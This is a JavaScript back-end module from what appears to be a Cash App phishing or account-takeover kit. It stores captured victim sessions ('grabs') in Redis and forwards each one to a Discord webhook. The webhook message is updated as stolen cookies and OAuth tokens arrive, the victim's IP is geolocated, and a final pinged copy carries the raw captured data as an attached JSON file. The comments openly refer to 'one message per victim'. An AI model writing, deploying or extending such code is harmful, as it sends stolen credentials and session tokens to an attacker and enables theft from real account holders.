/* ============================================================
   api/_store.js
   Persistence + Discord dispatch.

   Storage: Upstash Redis REST if configured, else in-memory.
   Env: UPSTASH_REDIS_REST_URL / _TOKEN  (or KV_REST_API_URL / _TOKEN)
   ============================================================ */

import {
  createMessage,
  editMessage,
  postWithFile,
  stageMeta,
  buildPayload,
  buildText,
  geoLookup,
} from './_discord.js';

const KEY = 'cashapp:adder:grabs';
const MAX = 1000;
const SKIP = new Set(['verify', 'unload']);

function cfg() {
  return {
    url: process.env.UPSTASH_REDIS_REST_URL || process.env.KV_REST_API_URL,
    token: process.env.UPSTASH_REDIS_REST_TOKEN || process.env.KV_REST_API_TOKEN,
  };
}

async function cmd() {
  const args = Array.prototype.slice.call(arguments);
  const c = cfg();
  if (!c.url || !c.token) return null;
  const r = await fetch(c.url, {
    method: 'POST',
    headers: { Authorization: 'Bearer ' + c.token, 'Content-Type': 'application/json' },
    body: JSON.stringify(args),
  });
  const j = await r.json();
  if (j.error) throw new Error(j.error);
  return j.result;
}

/* ---------- persistence ---------- */
export async function save(row) {
  const json = JSON.stringify(row);
  try {
    const res = await cmd('RPUSH', KEY, json);
    if (res !== null) {
      await cmd('LTRIM', KEY, -MAX, -1);
      return 'redis';
    }
  } catch (e) {
    console.error('[store] redis write failed:', e.message);
  }
  const g = globalThis.__grabs || (globalThis.__grabs = []);
  g.push(json);
  if (g.length > MAX) g.shift();
  return 'memory';
}

export async function all() {
  try {
    const res = await cmd('LRANGE', KEY, 0, -1);
    if (res && res.length) return res;
  } catch (e) {
    console.error('[store] redis read failed:', e.message);
  }
  return globalThis.__grabs || [];
}

/* ---------- dedupe (sendBeacon + fetch double-fire) ---------- */
export async function firstTime(key) {
  try {
    const r = await cmd('SET', 'cashapp:seen:' + key, '1', 'NX', 'EX', '120');
    if (r !== null) return r === 'OK';
  } catch {}
  const m = globalThis.__seen || (globalThis.__seen = new Map());
  if (m.has(key)) return false;
  m.set(key, Date.now());
  const now = Date.now();
  for (const [k, t] of m) if (now - t > 120000) m.delete(k);
  return true;
}

/* ---------- message id cache (fallback when client id is missing) ---------- */
export async function getMsgId(sid) {
  try {
    const v = await cmd('GET', 'cashapp:msg:' + sid);
    if (v) return v;
  } catch {}
  return (globalThis.__msg || {})[sid] || null;
}

export async function setMsgId(sid, id) {
  try {
    await cmd('SET', 'cashapp:msg:' + sid, id, 'EX', '7200');
  } catch {}
  const m = globalThis.__msg || (globalThis.__msg = {});
  m[sid] = id;
}

/* ---------- dispatch ---------- */
/**
 * Sends or updates the Discord message for this grab.
 * @returns {Promise<string|null>} the Discord message id
 */
export async function notify(row) {
  if (!process.env.DISCORD_WEBHOOK) return null;
  if (SKIP.has(row.stage)) return null;
  if (row.stage === 'landed' && process.env.DISCORD_ON_LOAD !== 'true') return null;

  const sid = row.sid || 'anon';
  const sid8 = sid.slice(0, 8);
  const mode = process.env.DISCORD_MODE || 'live';
  const fmt = process.env.DISCORD_FORMAT || 'embed';
  const meta = stageMeta(row.stage);
  const geo = await geoLookup(row.ip);
  const ping = process.env.DISCORD_PING || '';
  const isFinal = row.stage === 'done' || row.stage.indexOf('oauth_token') === 0;

  // a late cookie_update must not clobber a finished session
  if (row.stage === 'cookie_update' && (await getMsgId(sid + ':done'))) return null;

  const build = (withPing) => {
    const p = withPing ? (ping || '@here') : '';
    return fmt === 'text' ? buildText(row, meta, geo, p) : buildPayload(row, meta, geo, p);
  };

  /* ---- verbose: a brand new message for every stage ---- */
  if (mode === 'verbose') {
    const payload = build(isFinal);
    const res = isFinal
      ? await postWithFile(payload, 'grab-' + sid8 + '.json', JSON.stringify(row, null, 2))
      : await createMessage(payload);
    if (isFinal) await setMsgId(sid + ':done', '1');
    return res && res.id ? res.id : null;
  }

  /* ---- live: one message per victim, edited in place ---- */
  let msgId = row.msgId || (await getMsgId(sid));

  if (msgId) {
    const ok = await editMessage(msgId, build(false));
    if (!ok) {
      const fresh = await createMessage(build(false));
      msgId = fresh && fresh.id ? fresh.id : null;
    }
  } else {
    const created = await createMessage(build(false));
    msgId = created && created.id ? created.id : null;
  }

  if (msgId) await setMsgId(sid, msgId);

  /* ---- final: edits don't buzz a phone, so post a fresh pinged copy ---- */
  if (isFinal) {
    await setMsgId(sid + ':done', '1');
    const payload = build(true);
    if (payload.embeds && payload.embeds[0]) {
      payload.embeds[0].footer = { text: 'FINAL COPY · raw JSON attached · ' + sid8 };
    }
    const att = await postWithFile(payload, 'grab-' + sid8 + '.json', JSON.stringify(row, null, 2));
    if (att && att.id) {
      await setMsgId(sid, att.id);
      return att.id;
    }
  }

  return msgId;
}
